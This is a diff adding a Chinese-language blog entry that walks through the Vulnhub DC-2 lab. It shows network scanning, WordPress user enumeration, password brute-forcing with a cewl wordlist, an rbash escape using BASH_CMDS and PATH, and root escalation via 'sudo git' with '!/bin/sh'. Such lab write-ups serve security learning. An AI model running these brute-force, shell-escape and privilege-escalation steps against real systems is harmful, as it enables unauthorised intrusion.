@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>Vulnhub-DC2</title>
+      <link href="/posts/3bdfdcb0/"/>
+      <url>/posts/3bdfdcb0/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Vulnhub-DC2"><a href="#Vulnhub-DC2" class="headerlink" title="Vulnhub-DC2"></a>Vulnhub-DC2</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>首先<code>arp-scan -l</code>扫描存活的主机</p><p><img src="https://pic.imgdb.cn/item/6713b27dd29ded1a8cdd8e40.png"></p><p>使用<code>nmap</code>扫描开放的端口</p><p><code>nmap -sS -sV -O -T4 -A -p- 192.168.154.139</code></p><p><img src="https://pic.imgdb.cn/item/6713b36cd29ded1a8cdfde2d.png"></p><p>扫描到80 tcp端口和7744的ssh端口</p><p>访问扫描到的ip地址 发现访问不了</p><p><img src="https://pic.imgdb.cn/item/6713b3add29ded1a8ce079f3.png"></p><p>被重定向了，需要修改&#x2F;etc&#x2F;hosts文件</p><p><img src="https://pic.imgdb.cn/item/6713b440d29ded1a8ce1d598.png"></p><p>加上dc-2的ip后再次尝试访问</p><p>成功访问后发现flag1</p><p><img src="https://pic.imgdb.cn/item/6713b4bdd29ded1a8ce293f7.png"></p><p>翻译如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">你的常用字典可能不太管用，所以你可能需要更“cewl”一点。</span><br><span class="line"></span><br><span class="line">更多的密码总是更好，但有时候你不可能赢得全部。</span><br><span class="line"></span><br><span class="line">以某一个身份登录，看看能不能找到下一个 flag。</span><br><span class="line"></span><br><span class="line">如果找不到，那就尝试以另一个身份登录。</span><br></pre></td></tr></table></figure><p>提示用cewl生成字典</p><p>使用Wappalyzer浏览器插件查看网页的详细信息</p><p><img src="https://pic.imgdb.cn/item/6713b48cd29ded1a8ce26ad4.png"></p><p>或者使用whatweb命令查看网页详细信息</p><p><img src="https://pic.imgdb.cn/item/6713b58bd29ded1a8ce346be.png"></p><p>发现网站使用的时较低版本的wordpress框架</p><p>dirb扫描网站</p><p><img src="https://pic.imgdb.cn/item/6713b612d29ded1a8ce3ad14.png"></p><p>有wp-admin页面 访问</p><p><img src="https://pic.imgdb.cn/item/6713b665d29ded1a8ce3f3dd.png"></p><p>出现登录页面</p><p>与wordpress框架配套的有wpscan工具</p><p>使用wpscan工具扫描爆破用户</p><p><code>wpscan --url http://dc-2 -e u </code></p><p>扫描用户名</p><p><img src="https://pic.imgdb.cn/item/6713b7a0d29ded1a8ce5040d.png"></p><p>扫描到三个用户名 将三个用户名写入users.txt</p><p><code>echo -e &quot;admin \njerry \ntom&quot; &gt; users.txt</code></p><p>再使用cewl生成passwd.txt</p><p><code>cewl http://dc-2 -w passwd.txt </code></p><p>将生成的两个文件放到桌面后 使用wpscan爆破登录名和密码</p><p><code>wpscan --url http://dc-2 -U users.txt -P passwd.txt</code></p><p><img src="https://pic.imgdb.cn/item/6713b946d29ded1a8ce6b661.png"></p><p>爆破得到两个用户名和密码</p><p>使用用户名和密码登录</p><p>在jerry用户中的pages页面会发现flag2的提示</p><p><img src="https://pic.imgdb.cn/item/6713b9cdd29ded1a8ce73652.png"></p><p>没啥用…</p><p>ssh尝试连接 tom用户可以ssh连接 jerry无法连接</p><p><img src="https://pic.imgdb.cn/item/6713ba3dd29ded1a8ce7a1e6.png"></p><p><img src="https://pic.imgdb.cn/item/6713ba6dd29ded1a8ce7d1a3.png">、</p><p>发现id命令无法使用 输出当前SHELL后发现是rbash</p><p>是受限制的shell</p><p>查看可用的命令</p><p><img src="https://pic.imgdb.cn/item/6713baebd29ded1a8ce847fe.png"></p><p>发现只有4个可用的命令</p><p>使用ls和less查看flag3的内容</p><p><img src="https://pic.imgdb.cn/item/6713bb32d29ded1a8ce88e80.png"></p><p>提示需要切换到jerry用户</p><p>所以需要绕过rbash的限制 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a      #把/bin/sh给a变量</span><br><span class="line">export PATH=$PATH:/bin/     #将/bin作为PATH环境变量导出</span><br><span class="line">export PATH=$PATH:/usr/bin  #将/usr/bin作为PATH环境变量导出</span><br></pre></td></tr></table></figure><p>在tom处输入上述命令后即可绕过rbash的限制</p><p><img src="https://pic.imgdb.cn/item/671489fbd29ded1a8c300429.png"></p><p>切换到jerry目录下</p><p>查看flag4的内容</p><p>提示git sudo -l查看可以以root用户执行的命令 同样发现git</p><p><img src="https://pic.imgdb.cn/item/67148a90d29ded1a8c307456.png"></p><p>所以使用git提权</p><p><code>sudo git help config</code></p><p><code>!/bin/sh</code></p><p>完成提权 拿到最终的flag</p><p><img src="https://pic.imgdb.cn/item/67148b6ed29ded1a8c310e86.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 安全 </tag>
+            
+            <tag> 渗透 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>ciscn_2019_n_3</title>
       <link href="/posts/f0e3c24/"/>
       <url>/posts/f0e3c24/</url>
